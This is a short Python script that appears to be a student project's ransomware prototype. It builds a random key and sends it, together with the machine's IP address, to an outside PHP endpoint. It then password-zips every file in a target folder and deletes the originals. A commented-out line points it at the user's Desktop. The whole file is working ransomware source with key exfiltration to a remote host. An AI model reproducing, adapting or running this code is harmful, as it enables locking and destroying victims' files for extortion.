import sys
import random as rd
import requests
import os
import pyminizip
from os import path
from os import listdir
from os.path import isfile, join
    
#Desktop path
#targetDir = "C:" + os.environ["HOMEPATH"] + "\\Desktop\\"
targetDir =  "C:\\Users\\peter\\Desktop\\FYP\\RealFypDev\\testEnc\\"
#Key generation
keyRaw = []
for i in range(26):
    keyRaw.append(chr(97+i))
for i in range(10):
    keyRaw.append(chr(48+i))
rd.shuffle(keyRaw)

finalKey = ""
    
for i in range(36):
    finalKey += str(keyRaw[i])

#Use http requests to store key, identity (IP addr)
try:
    ipAddr = requests.get("http://checkip.amazonaws.com/")
    data = requests.get("http://500iqproject.atwebpages.com/storeKey.php?str=" + finalKey + "&ip=" + ipAddr.text)
    if "Record exists" in data.text:
        finalKey = data.text[14:50]
except:
    exit()
            
#get file list in desktop
targetFList = [f for f in listdir(targetDir) if isfile(join(targetDir, f))]

#encrypt process

def encryptContent():
    if len(targetFList) > 0:
        for i in range(len(targetFList)):
            try:
                pyminizip.compress(targetDir  + targetFList[i], "", targetDir + targetFList[i] + ".zip", finalKey, 0)
                os.remove(targetDir + targetFList[i])
            except:
                pass

            
encryptContent()


	
